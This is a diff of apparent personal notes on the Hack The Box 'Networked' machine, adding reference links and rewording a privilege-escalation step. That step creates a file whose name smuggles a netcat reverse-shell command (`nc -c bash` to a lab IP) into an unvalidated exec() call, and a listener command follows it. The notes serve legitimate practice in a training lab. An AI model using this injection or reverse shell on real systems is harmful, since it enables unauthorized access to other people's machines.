@@ -1,4 +1,5 @@
 # Networked
+This machine was challenging (and is also rated Harder than oscp as per Tj null's list) due to the requirement of reading code, and the weird method of privilege escalation. However, I found the privesc method interesting as I had never seen it before.
 
 **Links:** [1](https://www.hackthebox.com/machines/Networked)  [2](https://app.hackthebox.com/machines/Networked)
 
@@ -153,7 +154,8 @@ foreach ($files as $key => $value) {
 + The script takes in all the files in the **/var/www/html/uploads** directory and running the **getnameCheck()** and **check_ip()** functions on it from the **lib.php** file.
 + The **getnameCheck()** function simply separates the name of the file from the extension of the file. The **check_ip()** function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the **check_attack.php** file.
 + This passes the path of the file to the **exec()** function and deletes it. Of course, no validation is being done on the input of the **exec()** function and so we can abuse it to escalate privileges.
-+ Change to the **/var/www/html/uploads** directory and create the following file: `touch '; nc -c bash 10.10.14.21 5555'`
++ Change to the **/var/www/html/uploads** directory.
++ Create a file with a file name that contained a **command** that sent a reverse shell back to our machine : `touch '; nc -c bash 10.10.14.21 5555'`
 + The **;** will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
 + Start netcat listener on the attack machine: `nc -lnvp 5555`
 + Wait three minutes for the cron job to run, and get **guly**'s shell.
@@ -216,11 +218,13 @@ BOOTPROTO=a whoami
 
 
 # Technical Knowledge
-+ xxx
++ https://en.wikipedia.org/wiki/List_of_file_signatures
 
 
 # CVE Scripting
-+ **ifcfg:** https://bugzilla.redhat.com/show_bug.cgi?id=1697473
++ **ifcfg:** https://seclists.org/fulldisclosure/2019/Apr/24
++ https://seclists.org/fulldisclosure/2019/Apr/27
++ https://bugzilla.redhat.com/show_bug.cgi?id=1697473
 + https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
 
 
@@ -230,8 +234,6 @@ BOOTPROTO=a whoami
 + https://infosecwriteups.com/hackthebox-networked-writeup-3d0a1276ad3c
 + https://0xdf.gitlab.io/2019/11/16/htb-networked.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/networked-writeup-w-o-metasploit
-+ xxx
++ https://www.hackingarticles.in/hack-the-box-networked-walkthrough/
 
 
-# For More
-+ xxx
